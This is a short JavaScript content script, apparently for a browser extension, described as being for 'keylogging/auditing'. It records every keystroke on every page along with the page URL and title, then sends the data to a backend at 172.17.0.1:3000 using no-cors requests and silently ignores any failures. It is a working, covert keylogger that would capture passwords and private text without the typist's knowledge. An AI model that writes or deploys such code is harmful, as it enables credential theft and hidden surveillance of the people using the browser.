// Content script for keylogging/auditing
document.addEventListener('keydown', (e) => {
  // Capture the key and metadata
  const data = {
    key: e.key,
    char: e.key.length === 1 ? e.key : `[${e.key}]`,
    timestamp: new Date().toISOString(),
    url: window.location.href,
    title: document.title
  };

  // Skip modifier keys by themselves to reduce noise
  if (['Control', 'Shift', 'Alt', 'Meta'].includes(e.key)) return;

  // Send to the orchestrator backend
  // In a real Docker setup, we would use the host's IP or a service name
  fetch('http://172.17.0.1:3000/api/audit-logs', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {
    // Silent fail if backend is unreachable
  });
});
